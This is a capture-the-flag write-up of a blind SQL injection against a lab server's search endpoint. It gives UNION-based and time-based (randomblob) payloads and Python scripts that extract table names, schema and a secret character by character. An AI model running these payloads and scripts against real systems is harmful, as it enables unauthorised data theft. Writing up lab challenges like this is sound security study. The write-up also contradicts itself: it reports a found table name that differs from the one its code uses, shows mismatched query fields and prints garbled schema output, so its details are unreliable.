# Challenge `Sometimes we are just temporarily blind` writeup

- Vulnerability:
  - _Endpoint has a **sql** vulnerability_
- Where:
  - _`/?search=` endpoint_
- Impact:
  - _Allows to **obtain the table content** without having the authority to by making a blind sql injection in the server's search bar_

## Steps to reproduce

First we need to open a session in the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22262`. After the session is established we will can now start plotting what to do.

Since our objective is to obtain the secret content of a hidden table, we need to find a way to obtain some type of response from the server to know if we are successful or not. Since all queries won't show any type of response visually, we will need to do it blindly. First thing to do is to also find the table's name, and what type of query is being made.
As usual, we will start by making a bad input to see what the server will return. We will use the following payload:

```sql
' badInput
```

After sending the payload, the server returned the following error message:

```sql
[SQL: SELECT id, title, content FROM blog_post WHERE title LIKE '%'badInput%' OR content LIKE '%'badInput%']
```

We checked, and the query used is the same as before. Althought its the same we cannot use the same tatic since it won't be displayed for us to see. We will need to find a way to make the server return a response that we can see.

Before starting to make more difficult queries, we reused the payload used in the previous challenge to see what response we could get. The payload used was:

```sql
_' AND id=1 UNION SELECT 1,tbl_name,3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

There are 4 results! From the previous challenge we know 3 of them: `blog_post`,`user`,`Lorem Ipsum[...]`
So.. There is one more table that we don't know the name of. This is the table we need to find to get the flag.

Now that what we need to do is clear, we can start making more difficult queries. We will start by making a `UNION SELECT` query to find the name of the table we need. The payload used was:

```sql
_' and id=1 UNION SELECT 1,tbl_name,1 FROM sqlite_master WHERE type='table' AND tbl_name LIKE '<table_name><char>%' --
```

By iterating through all the characters possible and when matching adding the character to the name, the table name was found to be `secret_blog_post`.

The code used to do this requests was:

```python
def get_table_name():
    all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_"
    table_name = 's'
    #while that repeats until the table name is found
    #keeps on sending requests to the server with new characters to see if they are part of the name
    while True:
        for char in all_chars:
            query = f"/?search=_' and title=1 UNION SELECT 1,tbl_name,1 FROM sqlite_master WHERE type='table' AND tbl_name LIKE '{table_name}{char}%' --"
            r = session.get(SERVER + query)
            
            if r.text.find("Found 0 articles") != -1:
                continue
            
            elif r.text.find("Found 0 articles") == -1:
                table_name += char
                print(table_name)
                all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_"
                break
```

Although we have the table name we dont know what the table has, so unfortunately we need to try a different payload to find what the table has. The payload used in each iteration was:

```sql
"nothing' OR ((SELECT hex(substr(sql,<len(content) + 1>,1)) FROM sqlite_master WHERE type='table' and tbl_name ='secret_blog_post' limit 1 offset {offset}) = hex('{format(char)}') AND 1 = randomblob(100000000)) --"
```
Note: The 'nothing' is used so that the other part of the query fails. Randomblob is used to make the server take some more time to respond.

And the python code used to do this requests was:

```python
def get_table():
    table_name='super_s_sof_secrets'
    offset = 0
    content = ''
    all_chars = string.printable
    while True:
        for char in all_chars:
            query= f"nothing' OR ((SELECT hex(substr(sql,{len(content) + 1},1)) FROM sqlite_master WHERE type='table' and tbl_name ='{table_name}' limit 1 offset {offset}) = hex('{format(char)}') AND 1 = randomblob(100000000)) --"
            r = session.get(SERVER +"/?search=" + query)
            
            if r.elapsed.total_seconds() < 1.7:
                continue
            
            else:
                print(r.elapsed.total_seconds())
                print("seconds...")
                content += char
                print("current:" + content)
                break
```

Finaly we were able to see what the table had. The table had the following content:

```sql
CREATE TABLE super_s_sof_secrets (b	id INTEGER9NOT NULL, h	secret TEXT, 
```

Knowing this we can now make our last query to get the flag. The payload used was:

```sql
"nothing' OR ((SELECT hex(substr(secret,{len(content) + 1},1)) FROM {table_name} limit 1 offset {offset}) = hex('{format(char)}') AND 1 = randomblob(100000000)) --"
```

And the python code used to do this requests was:

```python
def get_secret():
    table_name='super_s_sof_secrets'
    offset = 0
    content = ''
    all_chars = string.printable
    while True:
        for char in all_chars:
            query= f"nothing' OR ((SELECT hex(substr(secret,{len(content) + 1},1)) FROM {table_name} limit 1 offset {offset}) = hex('{format(char)}') AND 1 = randomblob(100000000)) --"
            r = session.get(SERVER +"/?search=" + query)
            
            if r.elapsed.total_seconds() < 1.7:
                continue
            
            else:
                print(r.elapsed.total_seconds())
                print("seconds...")
                content += char
                print("current:" + content)
                break
```

Now, we have found the **hidden content of the secret table** and know the secret password, getting the `flag`.

Final Note: The script might differ in results depending on the quality of the connection to the server. Since its based on response time its possible that the server will respond faster or slower depending on the connection. Please try to run the script multiple times if it doesn't work the first time, and if it keeps on not working change the delay time to adequatly fit your connection.

## Script
The script used can be found [here](sometimes_we_are_just_temporarily_blind_poc.py)
